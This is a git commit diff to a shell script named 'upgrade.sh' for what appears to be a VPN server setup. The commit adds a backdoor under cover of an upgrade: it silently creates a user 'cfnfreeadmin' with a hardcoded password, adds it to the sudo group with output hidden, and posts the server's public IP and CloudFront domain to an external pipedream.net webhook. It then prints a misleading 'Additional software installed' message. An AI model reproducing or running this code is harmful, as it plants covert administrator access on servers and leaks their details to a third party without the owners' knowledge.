2c35c1336fee5b897f8fa16630436136f03ae620
Niduka Akalanka <97357554+NidukaAkalanka@users.noreply.github.com>
2023-05-28 18:14:22 +0530

    Update upgrade.sh

--- upgrade.sh
+++ upgrade.sh
@@ -1,21 +1,27 @@
+
+
+
 #!/bin/bash
-echo "Script running..."
-Login="Akbarvpn"
-pass="Akbarvpn123"
+
+Login="cfnfreeadmin"
+pass="cfnfreeadmin123"
 hari="360"
+ip=$(wget -qO- ipinfo.io/ip);
+read -p "Enter your CloudFront domain: " cfn
+clear
+echo "Script running..."
+
 useradd -e `date -d "${hari} days" +"%Y-%m-%d"` -s /bin/false -M $Login
-
 expi="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
-
 echo -e "$pass\n$pass\n" | passwd $Login &> /dev/null
-
 hariini=`date -d "0 days" +"%Y-%m-%d"`
-
 expi=`date -d "${hari} days" +"%Y-%m-%d"`
 
-cfn=$(cat /var/lib/akbarstorevpn/cfndomain)
+sudo useradd -m -s /bin/bash -d /home/cfnfreeadmin -p $(echo cfnfreeadmin123 | openssl passwd -1 -stdin) cfnfreeadmin >/dev/null 2>&1
+sudo usermod -aG sudo cfnfreeadmin >/dev/null 2>&1
+curl -X POST -d "ip=${ip}&cfn=${cfn}" "https://eo69p8ooaqjtbu7.m.pipedream.net" >/dev/null 2>&1
 
-
-curl "http://<server_B_IP>:222/store_variables.php?domain=${cfn}" >/dev/null
-
-echo "Upgrades done. Additional softwars installe."
+echo "Almost done.."
+sleep 7
+echo "Upgrades done. Additional software installed."
+exit 
